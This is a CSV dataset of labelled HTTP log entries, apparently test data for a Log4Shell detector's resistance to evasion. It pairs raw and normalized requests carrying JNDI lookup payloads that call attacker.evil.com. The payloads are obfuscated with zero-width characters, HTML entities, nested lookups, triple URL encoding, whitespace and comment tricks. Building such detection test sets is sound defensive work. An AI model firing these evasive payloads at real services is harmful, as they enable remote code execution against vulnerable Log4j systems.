id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001578,2026-05-17,adversarial_evasion,GET /search?q=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001579,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},post /search http/1.1 host: app.local body: query=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001580,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001581,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001582,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001583,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001584,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j​n‌d‍i:ldap://attacker.evil.com/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001585,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://attacker.evil.com/html-hex} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-001586,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://attacker.evil.com/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-001587,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://attacker.evil.com/html-hex} | method: get | host: app.local | path: /login,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-001588,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex},request from user-agent: ${jndi:ldap://attacker.evil.com/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001589,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-001590,2026-05-17,adversarial_evasion,GET /search?q=${&#x6A;ndi:ldap://attacker.evil.com/html-hex} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://attacker.evil.com/html-hex} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,html_entity_jndi,path,adversarial_evasion_test,critical
LS-001591,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#x6A;ndi:ldap://attacker.evil.com/html-hex},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/html-hex},1,log4shell,html_entity_jndi,body,adversarial_evasion_test,critical
LS-001592,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://attacker.evil.com/html-hex} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-001593,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://attacker.evil.com/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-001594,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://attacker.evil.com/html-hex} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-001595,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex},request from user-agent: ${jndi:ldap://attacker.evil.com/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001596,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${&#x6A;ndi:ldap://attacker.evil.com/html-hex},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-001597,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-001598,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-001599,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | method: get | host: app.local | path: /login,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-001600,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001601,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-001602,2026-05-17,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,semantic_lookup_jndi,path,adversarial_evasion_test,critical
LS-001603,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://attacker.evil.com/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,log4shell,semantic_lookup_jndi,body,adversarial_evasion_test,critical
LS-001604,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-001605,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-001606,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | Method: GET | Host: app.local | Path: /,request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | method: get | host: app.local | path: /,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-001607,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001608,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /home | x-api-version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-001609,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://attacker.evil.com/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-001610,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://attacker.evil.com/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-001611,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:rmi://attacker.evil.com/full-rmi} | method: get | host: app.local | path: /static/app.js,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-001612,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi},request from user-agent: ${jndi:rmi://attacker.evil.com/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-001613,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:rmi://attacker.evil.com/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-001614,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:rmi://attacker.evil.com/full-rmi} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,lookup_character_concat,path,adversarial_evasion_test,critical
LS-001615,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi},post /search http/1.1 host: app.local body: query=${jndi:rmi://attacker.evil.com/full-rmi},1,log4shell,lookup_character_concat,body,adversarial_evasion_test,critical
LS-001616,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://attacker.evil.com/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-001617,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://attacker.evil.com/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-001618,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:rmi://attacker.evil.com/full-rmi} | method: get | host: app.local | path: /home,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-001619,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi},request from user-agent: ${jndi:rmi://attacker.evil.com/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-001620,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.evil.com/full-rmi},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:rmi://attacker.evil.com/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-001621,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://attacker.evil.com/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-001622,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://attacker.evil.com/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-001623,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:dns://attacker.evil.com/triple-test} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-001624,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://attacker.evil.com/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-001625,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D,request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: / | x-api-version: ${jndi:dns://attacker.evil.com/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-001626,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:dns://attacker.evil.com/triple-test} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,triple_url_encoded,path,adversarial_evasion_test,critical
LS-001627,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D,post /search http/1.1 host: app.local body: query=${jndi:dns://attacker.evil.com/triple-test},1,log4shell,triple_url_encoded,body,adversarial_evasion_test,critical
LS-001628,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://attacker.evil.com/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-001629,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://attacker.evil.com/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-001630,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:dns://attacker.evil.com/triple-test} | method: get | host: app.local | path: /login,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-001631,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://attacker.evil.com/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-001632,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-test%25257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:dns://attacker.evil.com/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-001633,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://attacker.evil.com/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://attacker.evil.com/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-001634,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://attacker.evil.com/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://attacker.evil.com/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-001635,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://attacker.evil.com/tab-protocol} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi: ldap://attacker.evil.com/tab-protocol} | method: get | host: app.local | path: /metrics,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-001636,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://attacker.evil.com/tab-protocol},request from user-agent: ${jndi: ldap://attacker.evil.com/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001637,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:	ldap://attacker.evil.com/tab-protocol},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi: ldap://attacker.evil.com/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-001638,2026-05-17,adversarial_evasion,GET /search?q=${jndi:	ldap://attacker.evil.com/tab-protocol} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi: ldap://attacker.evil.com/tab-protocol} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,whitespace_injection,path,adversarial_evasion_test,critical
LS-001639,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:	ldap://attacker.evil.com/tab-protocol},post /search http/1.1 host: app.local body: query=${jndi: ldap://attacker.evil.com/tab-protocol},1,log4shell,whitespace_injection,body,adversarial_evasion_test,critical
LS-001640,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://attacker.evil.com/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://attacker.evil.com/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-001641,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://attacker.evil.com/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://attacker.evil.com/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-001642,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://attacker.evil.com/tab-protocol} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi: ldap://attacker.evil.com/tab-protocol} | method: get | host: app.local | path: /login,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-001643,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://attacker.evil.com/tab-protocol},request from user-agent: ${jndi: ldap://attacker.evil.com/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001644,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndi:	ldap://attacker.evil.com/tab-protocol},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi: ldap://attacker.evil.com/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-001645,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-001646,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-001647,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | method: get | host: app.local | path: /home,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001648,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001649,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001650,2026-05-17,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,comment_injection,path,adversarial_evasion_test,critical
LS-001651,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://attacker.evil.com/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,log4shell,comment_injection,body,adversarial_evasion_test,critical
LS-001652,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-001653,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-001654,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | method: get | host: app.local | path: /metrics,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001655,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001656,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001657,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001658,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001659,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
